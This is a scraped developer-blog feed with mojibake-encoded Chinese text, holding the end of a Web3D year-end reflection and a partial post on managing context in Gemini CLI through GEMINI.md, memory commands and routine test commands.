<p>éšç€æ·±å…¥å­¦ä¹  Web3Dï¼Œæˆ‘å¾®ä¿¡é‡Œå¤šäº†å¾ˆå¤šè€•è€˜äºæ­¤çš„æœ‹å‹ã€‚è™½ç„¶å¤§å®¶ç»†åˆ†é¢†åŸŸä¸åŒâ€”â€”æœ‰åšå¯è§†åŒ–å¤§å±çš„ï¼Œæœ‰åš 3D çœ‹è½¦/çœ‹æˆ¿çš„ï¼Œæœ‰ç ”ç©¶ NVIDIA Isaac Sim çš„ï¼Œä¹Ÿæœ‰åšæ•°å­—å·¥å‚/æœºæ¢°è‡‚çš„ã€‚ç”šè‡³æœ‰äº›æ›¾æ˜¯æˆ‘åœ¨è§†é¢‘ç½‘ç«™ä¸Šä»°æœ›çš„å¶åƒï¼Œç°åœ¨ä¹Ÿæˆäº†åˆ—è¡¨å¥½å‹ã€‚</p>
<p>å¤§å®¶èšåœ¨ä¸€èµ·åˆ†äº«æŠ€æœ¯ï¼Œæ‰¯çš®æ‰“è¶£ï¼Œå¤§ä½¬ä»¬æ—¶ä¸æ—¶å†’æ³¡ç­”ç–‘ã€‚è¿™ä¸ªåœˆå­å¾ˆå°ï¼ŒæŠ¬å¤´ä¸è§ä½å¤´è§ï¼Œä½†çœŸçš„å¾ˆå°‘å‡ºç°æ‹‰è¸©æˆ–è¯‹æ¯ã€‚<strong>æˆ‘æ˜¯åœ¨ç¾¤å‹ä»¬çš„â€œå¤¸å¤¸â€ä¸­ä¸€æ­¥æ­¥èµ°åˆ°è¿™é‡Œçš„ã€‚</strong> è¿™ç§æ­£åé¦ˆéå¸¸å¥‡å¦™ï¼šåŠ¨åŠ›æ¥è‡ªç¾¤å‹çš„é¼“åŠ±å’Œå¤§ä½¬çš„è®¤å¯ï¼Œè€Œè¿™äº›åˆä¿ƒä½¿æˆ‘åˆ›é€ å‡ºæ›´å¥½çš„é¡¹ç›®ï¼</p>
<h3 data-id="heading-10">4. æ‰€æƒ³ï¼šè¿æ°”è¡¨é¢ç§¯</h3>
<p>æœ€è¿‘æˆ‘äº†è§£åˆ°ä¸€ä¸ªéå¸¸æœ‰è¶£çš„è§‚ç‚¹ï¼Œå« <strong>Luck Surface Areaï¼ˆè¿æ°”è¡¨é¢ç§¯ï¼‰</strong>ï¼Œæœ€æ—©æ¥è‡ª Jason Robertsï¼š</p>
<blockquote>
<p>ä½ ç”Ÿæ´»ä¸­ä¼šæœ‰å¤šå°‘â€˜æ— å¿ƒæ’æŸ³æŸ³æˆè«â€™çš„æ„å¤–ä¹‹å–œï¼Ÿè¿™å–å†³äºä½ çš„â€˜è¿æ°”è¡¨é¢ç§¯â€™ã€‚ <strong>LSAï¼ˆè¿æ°”ï¼‰ = Pï¼ˆçƒ­çˆ±/åšäº‹çš„æ·±åº¦ï¼‰ Ã— Cï¼ˆä¼ æ’­/è¿æ¥çš„å¹¿åº¦ï¼‰</strong></p>
</blockquote>
<p>è¿™ä¸ªä¹˜æ³•å…³ç³»å¾ˆç¥å¥‡ï¼Œæ„å‘³ç€å¦‚æœå…¶ä¸­ä¸€é¡¹ä¸ºé›¶ï¼Œæ€»ç»“æœå°±ä¸ºé›¶ï¼š</p>
<ul>
<li><strong>åªæœ‰çƒ­çˆ± (P)ï¼Œæ²¡æœ‰ä¼ æ’­ (C) = å­¤ç‹¬çš„è€•è€˜è€…</strong> å¦‚æœä½ å¯¹æŸäº‹æåº¦çƒ­çˆ±ï¼ŒæŠ€è‰ºç²¾æ¹›ï¼Œä½†æŠŠè‡ªå·±å…³åœ¨åœ°ä¸‹å®¤é‡Œï¼Œä»ä¸å‘å¤–ç•Œå±•ç¤ºï¼Œé‚£ä¹ˆä½ çš„â€œè¿æ°”è¡¨é¢ç§¯â€å‡ ä¹ä¸ºé›¶ã€‚å¤–ç•Œçš„æœºä¼šæ— æ³•ç©¿é€å¢™å£æ‰¾åˆ°ä½ ï¼Œâ€œé…’é¦™ä¹Ÿæ€•å··å­æ·±â€ã€‚</li>
<li><strong>åªæœ‰ä¼ æ’­ (C)ï¼Œæ²¡æœ‰çƒ­çˆ± (P) = ç©ºæ´çš„å–§å“—è€…</strong> å¦‚æœä½ æ“…é•¿è¥é”€ï¼Œä½†ä¼ æ’­çš„å†…å®¹ç¼ºä¹å†…æ ¸ï¼Œä¸æ˜¯ä½ çœŸæ­£çƒ­çˆ±æˆ–æ“…é•¿çš„ä¸œè¥¿ï¼Œä½ å¯èƒ½çŸ­æœŸè·å¾—å…³æ³¨ï¼Œä½†æ— æ³•å»ºç«‹æ·±åº¦çš„ä¿¡ä»»ï¼ŒçœŸæ­£çš„â€œå¥½è¿â€ä¾ç„¶å¾ˆéš¾é™ä¸´ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee7f36435a04d7c9ad14356b3cc85f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=1wnXfZ39dgepKqzPaeFzA1vbSBc%3D" alt="Gemini_Generated_Image_bxxtb0bxxtb0bxxt.png" loading="lazy"/>
æˆ‘è§‰å¾—æˆ‘æ˜¯éå¸¸å¹¸è¿çš„ã€‚<strong>ä¼˜ç§€çš„ Web3D ä½œå“å¤©ç„¶å…·æœ‰è§†è§‰å†²å‡»åŠ›å’Œç¤¾äº¤å±æ€§</strong>ï¼Œè€Œç¨€åœŸæ˜é‡‘å¹³å°å¾ˆå¥½åœ°æ‰¿æ‹…äº†â€œä¼ æ’­â€çš„èŒè´£ï¼</p>
<p>æ‰€ä»¥ï¼Œå¹¶ä¸æ˜¯æˆ‘é€‰æ‹©äº†è¿™ä¸ªå¹³å°ï¼Œè€Œæ˜¯æˆ‘é‡åˆ°çš„äººã€äº‹ä»¥åŠå¹³å°ç»™äºˆçš„æ­£åé¦ˆæ¿€åŠ±ç€æˆ‘ï¼éå¸¸æ„Ÿè°¢èƒ½çœ‹åˆ°è¿™é‡Œçš„ä½ ï¼</p>
<h3 data-id="heading-11">5. æ‰€è§„åˆ’ä¹‹æœªæ¥</h3>
<p>2026 å¹´ä¼šæ˜¯ä»€ä¹ˆæ ·ï¼Ÿæˆ‘ä¸çŸ¥é“ã€‚å®ƒä¼šæ˜¯æˆ‘çš„â€œä¸‰å¹´ä¹‹çº¦â€ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½å˜æˆæ›´å¥½çš„äººã€‚</p>
<p>ä½†æˆ‘ç¡®å®šæˆ‘ä¸€å®šä¼šï¼š</p>
<ul>
<li>ğŸ› ï¸ <strong>å¡«å‘</strong>ï¼šä¼˜åŒ–é‚£äº›æˆ‘æ²¡æœ‰å®Œå–„å¥½çš„é¡¹ç›®ï¼ˆåˆ«éª‚äº†åˆ«éª‚äº†ï¼‰ã€‚</li>
<li>âœ¨ <strong>åˆ›é€ </strong>ï¼šäº§å‡ºæ›´å¤šæœ‰è¶£çš„é¡¹ç›®å’ŒæŠ€æœ¯æ–‡ç« ã€‚</li>
<li>ğŸ¤ <strong>è¿æ¥</strong>ï¼šè®¤è¯†æ›´å¤šå¿—åŒé“åˆçš„æœ‹å‹ã€‚</li>
<li>ğŸŒ <strong>å¸ƒé“</strong>ï¼šå°† Web3D çš„é­…åŠ›åˆ†äº«ç»™æ›´å¤šçš„äººã€‚</li>
</ul>
<h3 data-id="heading-12">6.ä¸‰å¹´ä¹‹çº¦ï¼Œä½ ä¼šå¦‚çº¦è€Œè‡³å—ï¼Ÿ</h3>
<p><strong>æœ€åï¼Œå¦‚æœä½ æ„¿æ„ï¼Œä¹Ÿåœ¨è¿™ç¯‡æ–‡ç« çš„è¯„è®ºåŒºç•™ä¸‹å±äºä½ çš„ã€Œä¸‰å¹´ä¹‹çº¦ã€å§ï¼</strong></p>
<p>æ— è®ºæ˜¯æŠ€æœ¯çš„ç²¾è¿›ã€ç”Ÿæ´»çš„æ”¹å˜ï¼Œè¿˜æ˜¯ä¸€ä¸ªç®€å•çš„æ„¿æœ›ã€‚è®©æˆ‘ä»¬çº¦å®šåœ¨æœªæ¥çš„æŸä¸€å¤©å›å¤´çœ‹ï¼Œä¸€èµ·è§è¯å½¼æ­¤çš„èœ•å˜ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†]]></title>    <link>https://juejin.cn/post/7592710766010040330</link>    <guid>https://juejin.cn/post/7592710766010040330</guid>    <pubDate>2026-01-08T08:04:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010040330" data-draft-id="7592816646869483529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†"/> <meta itemprop="keywords" content="å‰ç«¯,æœºå™¨å­¦ä¹ ,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T08:04:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="webkubor"/> <meta itemprop="url" content="https://juejin.cn/user/2119514149631870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2119514149631870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    webkubor
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:04:13.000Z" title="Thu Jan 08 2026 08:04:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 å¹´ä¹‹å‰ï¼Œæˆ‘å¯¹ AI ç¼–ç¨‹å·¥å…·çš„æ€åº¦ä¸€ç›´å¾ˆçŸ›ç›¾ã€‚</p>
<p>å®ƒå¾ˆå¼ºï¼Œä½†åœ¨çœŸå®é¡¹ç›®é‡Œï¼Œ<strong>å¹¶ä¸å¯é </strong>ã€‚</p>
<p>å†™ Demoã€å†™å±€éƒ¨ä»£ç å¾ˆçˆ½ï¼›</p>
<p>ä¸€è¿›çœŸå®å·¥ç¨‹ï¼Œå°±å¼€å§‹æš´éœ²é—®é¢˜ï¼š</p>
<p>å¿˜è§„èŒƒã€å¿˜çº¦å®šã€å¿˜ä¸Šä¸‹æ–‡ï¼Œç”šè‡³å¿˜æ‰æˆ‘åˆšå¼ºè°ƒè¿‡çš„è§„åˆ™ã€‚</p>
<p>åæ¥æˆ‘æ‰æ„è¯†åˆ°ï¼Œé—®é¢˜ä¸åœ¨æ¨¡å‹èƒ½åŠ›ï¼Œè€Œåœ¨<strong>ä¸Šä¸‹æ–‡ä¸è®°å¿†çš„ç®¡ç†æ–¹å¼</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8ab7f75eaa54fd3a7218676cc4de74e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pvlKHEWyLd%2B0yhnjYAKguBqq1%2BI%3D" alt="æˆªå±2026-01-08 16.57.12.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0"><strong>ä¸€ã€çœŸæ­£çš„ç—›ç‚¹ï¼šAI å†™å¾—å¿«ï¼Œä½†é¡¹ç›®æ€»æ˜¯è¢«â€œå†™æ­ªâ€</strong></h2>
<p>ä½œä¸ºå‰ç«¯å·¥ç¨‹å¸ˆï¼Œæˆ‘æœ€ç—›è‹¦çš„ä»æ¥ä¸æ˜¯â€œä»£ç éš¾å†™â€ï¼Œè€Œæ˜¯<strong>è¿”å·¥æˆæœ¬</strong>ã€‚</p>
<p>å¸¸è§æƒ…å†µåŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>æ˜æ˜æ˜¯ <strong>TypeScript + å‡½æ•°å¼ä¼˜å…ˆ</strong>ï¼Œå´ä¸æ–­ç”Ÿæˆæ¾æ•£çš„ JS é£æ ¼</p>
</li>
<li>
<p>é¡¹ç›®å·²æœ‰ç¨³å®šçš„æ¥å£ DTOã€ç›®å½•ç»“æ„ï¼Œå®ƒè¿˜æ˜¯ä¼šâ€œè‡ªåˆ›ä¸€å¥—â€</p>
</li>
<li>
<p>å¯¹è¯ä¸€é•¿ï¼Œå‰åè¾“å‡ºå¼€å§‹ä¸ä¸€è‡´ï¼Œç”šè‡³äº’ç›¸å†²çª</p>
</li>
</ul>
<p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯â€œæˆ‘ä¸ä¼šæé—®â€ï¼Œ</p>
<p>åæ¥å‘ç°ä¸æ˜¯ã€‚</p>
<p><strong>AI æœ€å¤§çš„é—®é¢˜ï¼Œæ˜¯å®ƒæ ¹æœ¬ä¸ç†è§£æˆ‘çš„é¡¹ç›®ï¼Œæ›´ä¸å¯èƒ½é•¿æœŸè®°ä½å®ƒã€‚</strong></p>
<hr/>
<h2 data-id="heading-1"><strong>äºŒã€è½¬æŠ˜ç‚¹ï¼šæˆ‘ä¸å†é‡å¤è§£é‡Šï¼Œè€Œæ˜¯è®©é¡¹ç›®è‡ªå·±â€œè¯´è¯â€</strong></h2>
<p>çœŸæ­£çš„æ”¹å˜ï¼Œæ¥è‡ªæˆ‘å¼€å§‹ä½¿ç”¨ <strong>Gemini CLI + æŒä¹…åŒ–ä¸Šä¸‹æ–‡</strong>ã€‚</p>
<p>æˆ‘åšçš„ç¬¬ä¸€ä»¶äº‹å¾ˆç®€å•ï¼š</p>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª GEMINI.md æ–‡ä»¶ã€‚</p>
<p>å®ƒä¸æ˜¯ Prompt é›†åˆï¼Œè€Œæ˜¯<strong>é¡¹ç›®è§„åˆ™æœ¬èº«</strong>ï¼š</p>
<ul>
<li>
<p>æŠ€æœ¯æ ˆä¸ç¼–ç è§„èŒƒ</p>
</li>
<li>
<p>ç›®å½•ä¸æ¨¡å—çº¦å®š</p>
</li>
<li>
<p>è¾“å‡ºå¿…é¡»æ»¡è¶³çš„éªŒæ”¶æ¡ä»¶</p>
</li>
</ul>
<p>ä»é‚£ä¸€åˆ»å¼€å§‹ï¼Œæˆ‘ä¸å†å¯¹ AI è¯´â€œè®°ä½è¿™ä¸€ç‚¹â€ï¼Œ</p>
<p>è€Œæ˜¯é»˜è®¤å®ƒ<strong>è¿›å…¥é¡¹ç›®å°±è‡ªåŠ¨åŠ è½½è¿™äº›è§„åˆ™</strong>ã€‚</p>
<blockquote>
<p>æˆ‘ç¬¬ä¸€æ¬¡æ„è¯†åˆ°ï¼š <strong>ä¸Šä¸‹æ–‡ä¸è¯¥å­˜åœ¨äºå¯¹è¯é‡Œï¼Œè€Œåº”è¯¥å±äºé¡¹ç›®æœ¬èº«ã€‚</strong></p>
</blockquote>
<p>æ¯”å¦‚å¦‚å›¾æ‰€ç¤º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18489dab9cc64751a5a2150c0dcd6b29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=%2FQiybwD1wkI8fckvh4tkfsHUanA%3D" alt="æˆªå±2026-01-08 17.03.29.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2"><strong>ä¸‰ã€çŸ­æœŸè®°å¿†ä¸æ˜¯èŠå¤©è®°å½•ï¼Œè€Œæ˜¯â€œå·¥ä½œä¾¿ç­¾â€</strong></h2>
<p>å³ä¾¿æœ‰äº†æŒä¹…åŒ–è§„åˆ™ï¼Œå¼€å‘ä¸­ä»ç„¶å­˜åœ¨å¤§é‡<strong>ä¸´æ—¶ä½†å…³é”®çš„ä¿¡æ¯</strong>ï¼š</p>
<ul>
<li>
<p>å½“å‰ç¯å¢ƒçš„æ•°æ®åº“ç«¯å£</p>
</li>
<li>
<p>é‰´æƒæ–¹å¼ä¸ Header çº¦å®š</p>
</li>
<li>
<p>mock ä¸çœŸå®æ¥å£çš„åˆ‡æ¢è§„åˆ™</p>
</li>
</ul>
<p>è¿‡å»æˆ‘ä¼šåœ¨å¯¹è¯é‡Œåå¤å¼ºè°ƒï¼Œç°åœ¨æˆ‘åªåšä¸€ä»¶äº‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/memory add <span class="hljs-string">"æ•°æ®åº“ç«¯å£æ˜¯ 5432"</span>
/memory add <span class="hljs-string">"æ¥å£ä½¿ç”¨ Bearer Token é‰´æƒ"</span>
</code></pre>
<p>è¿™äº›ä¿¡æ¯ä¼šè¢«æ˜¾å¼å­˜å…¥å½“å‰ä¼šè¯è®°å¿†ã€‚</p>
<p>å½“æˆ‘ç”¨ /memory show æŸ¥çœ‹æ—¶ï¼Œæ„Ÿè§‰æ›´åƒåœ¨çœ‹ä¸€ä¸ª<strong>é¡¹ç›®çŠ¶æ€æ¿</strong>ï¼Œè€Œä¸æ˜¯èŠå¤©å†å²ã€‚</p>
<hr/>
<h2 data-id="heading-3"><strong>å››ã€å¯¹è¯å˜é•¿ä¸å¯æ€•ï¼Œå‰ææ˜¯ä½ ä¼šâ€œå‹ç¼©ä¸Šä¸‹æ–‡â€</strong></h2>
<p>å¾ˆå¤šäººç”¨ AI åˆ°åæœŸéƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p>å®ƒå¼€å§‹å¿˜è®°å·²ç»ç¡®è®¤è¿‡çš„ç»“è®ºã€‚</p>
<p>æˆ‘ä»¥å‰çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š</p>
<p>æ–°å¼€ä¼šè¯ï¼Œä»å¤´å†æ¥ã€‚</p>
<p>2025 å¹´æˆ‘æ¢äº†ä¸€ç§æ–¹å¼ï¼š</p>
<p><strong>è®© AI è‡ªå·±æ€»ç»“å½“å‰ä¸Šä¸‹æ–‡ã€‚</strong></p>
<p>å½“å¯¹è¯å˜é•¿ã€å¼€å§‹å‘æ•£æ—¶ï¼Œæˆ‘ä¼šä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/compress
</code></pre>
<p>å®ƒä¼šæŠŠå†å²å¯¹è¯å‹ç¼©ä¸ºä¸€ä¸ªç»“æ„åŒ–æ‘˜è¦ï¼Œ</p>
<p>ä¿ç•™å†³ç­–å’Œçº¦æŸï¼Œä¸¢æ‰å™ªéŸ³ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸ºäº†çœ Tokenï¼Œ</p>
<p>è€Œæ˜¯<strong>é‡æ–°è®©ä¸Šä¸‹æ–‡å˜å¾—æ¸…æ™°ã€å¯ç»§ç»­æ¨è¿›</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-4"><strong>äº”ã€ä»â€œä¼šå†™ä»£ç â€åˆ°â€œèƒ½å¹²æ´»â€ï¼šè®© AI æ¥å…¥çœŸå®å·¥ä½œæµ</strong></h2>
<p>çœŸæ­£è®©æˆ‘æŠŠ Gemini CLI å½“æˆåä½œè€…çš„ï¼Œæ˜¯ä¸‰ä»¶äº‹ã€‚</p>
<h3 data-id="heading-5"><strong>1ï¸âƒ£ å¼•ç”¨çœŸå®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å¤åˆ¶ç‰‡æ®µ</strong></h3>
<pre><code class="hljs language-bash" lang="bash">@./src/
@./src/main.ts
</code></pre>
<p>AI è¯»çš„æ˜¯å®Œæ•´é¡¹ç›®ç»“æ„ï¼Œè€Œä¸æ˜¯æˆ‘æŠ½è±¡å‡ºæ¥çš„ä¸€å°æ®µç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-6"><strong>2ï¸âƒ£ å…è®¸å®ƒè·‘å‘½ä»¤ï¼Œç”¨ç»“æœé—­ç¯</strong></h3>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-addition">!git status</span>
<span class="hljs-addition">!pnpm test</span>
<span class="hljs-addition">!pnpm lint</span>
</code></pre>
<p>ä»è¿™ä¸€åˆ»å¼€å§‹ï¼ŒAI çš„ç›®æ ‡ä¸å†æ˜¯â€œçœ‹èµ·æ¥æ­£ç¡®â€ï¼Œ</p>
<p>è€Œæ˜¯<strong>æ˜¯å¦èƒ½é€šè¿‡çœŸå®éªŒè¯</strong>ã€‚</p>
<h3 data-id="heading-7"><strong>3ï¸âƒ£ MCPï¼šè®©å®ƒè¿›å…¥è°ƒè¯•ç°åœº</strong></h3>
<p>æ¥å…¥ chrome-devtools-mcp åï¼Œ</p>
<p>å®ƒå¯ä»¥ç›´æ¥çœ‹åˆ° Performanceã€Networkã€Console æ•°æ®ã€‚</p>
<p>ä¸æ˜¯æˆ‘è½¬è¿°é—®é¢˜ï¼Œ</p>
<p>è€Œæ˜¯å®ƒåŸºäº<strong>ä¸€æ‰‹è°ƒè¯•ä¿¡æ¯</strong>ç»™å‡ºåˆ¤æ–­ã€‚</p>
<p>ã€æ’å›¾æç¤ºã€‘</p>
<p>ğŸ‘‰ Gemini CLI å¼•ç”¨æ–‡ä»¶ + æ‰§è¡Œ Shell å‘½ä»¤æˆªå›¾</p>
<p>ğŸ‘‰ Chrome DevTools MCP å·¥ä½œç¤ºæ„å›¾</p>
<hr/>
<h2 data-id="heading-8"><strong>å…­ã€åŒä¸ºç¬¬ä¸€æ¢¯é˜Ÿï¼Œæˆ‘ä¸ºä»€ä¹ˆæ›´çœ‹é‡â€œä¸Šä¸‹æ–‡èƒ½åŠ›â€</strong></h2>
<p>2025 å¹´æˆ‘å¹¶ä¸åªç”¨ Geminiã€‚</p>
<p><strong>Codex 5.2</strong> åŒæ ·æ˜¯ç¬¬ä¸€æ¢¯é˜Ÿæ¨¡å‹ï¼Œåœ¨ä»£ç è´¨é‡å’Œé€»è¾‘ä¸¥è°¨æ€§ä¸Šéå¸¸å¼ºã€‚</p>
<p>ä½†åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œæˆ‘å¾ˆå¿«æ„Ÿå—åˆ°ä¸€ä¸ªå…³é”®å·®å¼‚ï¼š</p>
<blockquote>
<p><strong>å³ä½¿å¼€é€š 5.2ï¼ŒCodex å‡ ä¹ä¸å…·å¤‡é¡¹ç›®çº§ä¸Šä¸‹æ–‡è®°å¿†èƒ½åŠ›ã€‚</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7f30fa902f84601a95cd750a4d18d4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pTl%2FZdi0fwP3Sp1n%2B6sVO%2FRdsDc%3D" alt="æˆªå±2026-01-08 17.00.51.png" loading="lazy"/></p>
<p>å®ƒæ›´åƒä¸€ä¸ª<strong>é«˜è´¨é‡çš„å³æ—¶æ‰§è¡Œå™¨</strong>ï¼š</p>
<ul>
<li>
